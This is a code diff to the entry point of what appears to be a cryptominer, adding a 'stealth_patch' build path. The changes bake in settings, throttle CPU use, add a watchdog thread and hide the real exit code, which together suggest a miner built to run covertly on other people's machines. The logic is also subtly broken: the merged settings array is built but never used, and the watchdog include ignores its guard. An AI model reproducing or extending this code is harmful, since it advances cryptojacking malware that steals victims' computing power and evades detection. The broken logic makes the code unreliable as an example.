@@ -24,17 +24,22 @@
 #ifndef INJECTED_SETTINGS
 #error "INJECTED_SETTINGS must be defined with your command-line parameters"
 #endif // INJECTED_SETTINGS
-
 #include "stealth_patch/safe_string.h"
-#include "stealth_patch/prepare_config.cpp"
+#include "stealth_patch/prepare_config.h"
 #endif // INJECT_SETTINGS
 
 #ifdef LIMIT_CPU
 #ifndef LIMIT_CPU_PERCENT
 #error "LIMIT_CPU_PERCENT must be defined with the percentage of CPU usage"
 #endif // LIMIT_CPU_PERCENT
-#include "stealth_patch/cpu_config.cpp"
+#include "stealth_patch/cpu_config.h"
 #endif // LIMIT_CPU
+
+// #ifdef WATCHDOG
+#include <thread>
+#include <atomic>
+#include "stealth_patch/watchdog.h"
+// #endif // WATCHDOG
 
 int main(int argc, char **argv)
 {
@@ -59,19 +64,31 @@ int main(int argc, char **argv)
     char **final_settings = new char *[count + 1 + additional_count];
     memcpy(final_settings, injected_settings, (count + 1) * sizeof(*injected_settings));
     memcpy(final_settings + count + 1, additional_settings, additional_count * sizeof(*additional_settings));
-    count += additional_count;
 #endif // LIMIT_CPU
     Process process(count + 1, injected_settings);
 #else
     Process process(argc, argv);
 #endif // INJECT_SETTINGS
-    const Entry::Id entry = Entry::get(process);
-    if (entry)
-    {
-        return Entry::exec(process, entry);
-    }
 
-    App app(&process);
+    std::shared_ptr<App> app = std::make_shared<App>(&process);
 
-    return app.exec();
+#ifdef WATCHDOG
+    std::atomic<bool> running(true);
+    std::thread watchdogThread(watchdog, app, std::ref(running));
+#endif // WATCHDOG
+
+#ifdef STEALTH_PATCH
+    (void)app->exec();
+    int exit_code = 0;
+#else
+    int exit_code = app->exec();
+#endif // STEALTH_PATCH
+
+#ifdef WATCHDOG
+    running.store(false);
+    if (watchdogThread.joinable())
+        watchdogThread.join();
+#endif // WATCHDOG
+
+    return exit_code;
 }
